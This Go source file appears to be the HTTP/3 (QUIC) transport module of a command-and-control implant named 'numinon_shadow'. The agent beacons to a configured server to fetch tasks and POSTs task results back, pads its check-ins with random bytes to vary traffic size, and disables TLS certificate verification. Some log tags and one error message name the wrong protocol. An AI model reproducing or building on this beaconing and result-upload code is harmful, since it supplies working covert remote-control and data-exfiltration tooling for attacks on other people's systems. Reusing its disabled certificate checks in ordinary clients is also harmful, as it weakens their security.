package comm

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
	"io"
	"log"
	"net/http"
	"net/url"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/agent/utils"
	"numinon_shadow/internal/models"
	"strings"
)

var _ Communicator = (*Http3Communicator)(nil)

type Http3Communicator struct {
	agentConfig config.AgentConfig
	httpClient  *http.Client
}

// NewHttp3Communicator creates an HTTP/3 communicator.
func NewHttp3Communicator(cfg config.AgentConfig) (*Http3Communicator, error) {
	err := BasicValidateH3(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|COMM INIT|-> Initializing HTTP/3 Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)

	// --- Configure TLS for QUIC/HTTP3 ---
	// QUIC requires TLS 1.3 and ALPN must include "h3".
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h3"},   // MUST include "h3" for HTTP/3
		MinVersion:         tls.VersionTLS13, // QUIC requires TLS 1.3
	}

	log.Printf("|WARN COMM INIT H3| TLS certificate verification is DISABLED (TLSSkipVerify=true).")

	// --- Create the HTTP/3 Transport ---
	// This is the core transport mechanism provided by quic-go/http3.
	// It is a long-lived object that manages connections.
	transport := &http3.Transport{
		TLSClientConfig: tlsConfig,
		QUICConfig: &quic.Config{
			// Optional: Add QUIC-specific config if needed.
			// For example, to increase idle timeout:
			// MaxIdleTimeout: 60 * time.Second,
		},
		// EnableDatagrams: false, // If you need QUIC datagram support
	}

	client := &http.Client{
		Transport: transport,
	}

	return &Http3Communicator{
		agentConfig: cfg,
		httpClient:  client,
	}, nil

}

func BasicValidateH3(cfg config.AgentConfig) error {
	if cfg.Protocol != config.HTTP3 {
		return fmt.Errorf("mismatched config: NewHttp2ClearCommunicator called with protocol %s", cfg.Protocol)
	}
	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
		return fmt.Errorf("config requires ServerIP, ServerPort, and CheckInEndpoint")
	}
	return nil
}

// Connect is a no-op
func (c *Http3Communicator) Connect() error {
	log.Println("|COMM H3|-> Connect() called (no-op for H3/QUIC)")
	return nil
}

// Disconnect is for cleanup logic.
func (c *Http3Communicator) Disconnect() error {
	log.Println("|COMM H3|-> Disconnect() called (no-op for H3/QUIC)")
	return nil
}

// CheckIn performs a GET request to the CheckInEndpoint to fetch tasks.
// Returns the raw response body which might contain tasking information.
func (c *Http3Communicator) CheckIn() ([]byte, error) {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https",
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.CheckInEndpoint,
	}
	fullURL := targetURL.String()

	// CREATE THE REQUEST
	var req *http.Request
	var err error

	// --- Conditional GET vs POST ---
	if strings.ToUpper(c.agentConfig.CheckinMethod) == "POST" {
		log.Printf("|COMM %s|-> Checking in via POST to %s", c.Type(), fullURL)

		payloadPadding, err := utils.GenerateRandomPadding(c.agentConfig.MinPaddingBytes, c.agentConfig.MaxPaddingBytes)

		if err != nil {
			return nil, err
		}

		if c.agentConfig.EnablePadding && c.agentConfig.MaxPaddingBytes > 0 {
			checkinPayload := models.AgentCheckIn{
				Padding: payloadPadding,
			}
			log.Printf("|COMM %s|-> Added padding (SIZE: %d bytes) to POST check-in.", c.Type(), len(payloadPadding))

			bodyBytes, marshalErr := json.Marshal(checkinPayload)
			if marshalErr != nil {
				log.Printf("|❗ERR COMM %s| Failed to marshal POST check-in payload: %v", c.Type(), marshalErr)
				return nil, fmt.Errorf("failed to marshal POST check-in payload: %w", marshalErr)
			}

			req, err = http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(bodyBytes))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
			}
		}

	} else { // Default to GET
		log.Printf("|COMM %s|-> Checking in via GET to %s", c.Type(), fullURL)
		req, err = http.NewRequest(http.MethodGet, fullURL, nil)
	}

	if err != nil {
		log.Printf("|❗ERR COMM %s| Failed to create check-in request: %v", c.Type(), err)
		return nil, fmt.Errorf("failed to create %s check-in request: %w", c.Type(), err)
	}

	// SET HEADERS
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Checkin")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H1TLS| Check-in request failed: %v", err)
		return nil, fmt.Errorf("http check-in request failed: %w", err)
	}
	defer resp.Body.Close()

	// --- VERIFY PROTOCOL ---
	log.Printf("|COMM H3|-> Check-in response: Status=%s, PROTOCOL=%s", resp.Status, resp.Proto)
	if resp.Proto != "HTTP/3.0" { // Check for exact H3 string
		log.Printf("|WARN COMM H3| Expected HTTP/3.0, but received %s!", resp.Proto)
	}
	// --- END VERIFY PROTOCOL ---

	// READ RESPONSE (COULD CONTAIN INSTRUCTIONS)
	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("|❗ERR COMM H2TLS| Failed to read check-in response body: %v", err)
		return nil, fmt.Errorf("failed to read check-in response body: %w", err)
	}

	log.Printf("|COMM H2TLS|-> Successfully read %d bytes from check-in response", len(responseBody))
	return responseBody, nil
}

// SendResult performs a POST request to the ResultsEndpoint to submit task results.
func (c *Http3Communicator) SendResult(resultData []byte) error {
	// CONSTRUCT THE TARGET URL
	targetURL := url.URL{
		Scheme: "https", // Hardcoded for H1C
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.ResultsEndpoint,
	}
	fullURL := targetURL.String()
	log.Printf("|COMM H3|-> Sending %d bytes of results via POST to %s", len(resultData), fullURL)

	// CREATE THE HTTP POST REQUEST
	req, err := http.NewRequest(http.MethodPost, fullURL, bytes.NewReader(resultData))
	if err != nil {
		log.Printf("|❗ERR COMM H3| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// SET THE HEADERS
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "NuminonAgent/0.1-Result")
	req.Header.Set("Agent-ID", c.agentConfig.UUID)

	// EXECUTE THE REQUEST
	resp, err := c.httpClient.Do(req)
	if err != nil {
		log.Printf("|❗ERR COMM H3| Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("|COMM H3|-> Results POST response: Status=%s, Proto=%s", resp.Status, resp.Proto)

	log.Printf("|COMM H3|-> Successfully sent results.")
	return nil
}

func (c *Http3Communicator) Type() config.AgentProtocol {
	return config.HTTP3
}
